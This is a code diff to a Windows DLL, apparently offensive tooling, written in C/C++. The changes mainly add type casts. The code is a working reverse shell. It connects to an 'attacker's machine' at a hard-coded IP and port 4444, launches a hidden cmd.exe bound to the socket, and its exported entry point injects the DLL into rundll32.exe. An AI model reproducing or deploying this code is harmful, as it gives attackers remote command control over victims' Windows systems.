@@ -7,11 +7,11 @@ int reverse(void) {
 	WSADATA wsaData;
 	SOCKET wSock;
 	struct sockaddr_in sock;
-	STARTUPINFO si;
+	STARTUPINFOA si;
 	PROCESS_INFORMATION pi;
 
 	// listener ip, port on attacker's machine
-	char* ip = "192.168.1.240";
+	char *ip = (char *)"192.168.1.240";
 	short port = 4444;
 
 	// init socket lib
@@ -33,17 +33,17 @@ int reverse(void) {
 	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)wSock;
 
 	// start cmd.exe with redirected streams
-	CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+	CreateProcessA(NULL, (char *)"cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
 	exit(0);
 }
 
 extern "C" __declspec(dllexport) void FunEntry() {
-	LPSTR target_path = "C:\\Windows\\System32\\rundll32.exe";
+	LPSTR target_path = (char *)"C:\\Windows\\System32\\rundll32.exe";
 	DWORD dll_param;
 	char dll_path[MAX_PATH];
 	DWORD ret = GetModuleFileNameA((HINSTANCE)dll_param, dll_path, MAX_PATH);
 	reverse();
-	Tools::AutoInject(target_path, dll_path);
+	 Tools::AutoInject(target_path, dll_path);
 }
 
 BOOL APIENTRY DllMain(HMODULE Base, DWORD Callback, LPVOID Param) {
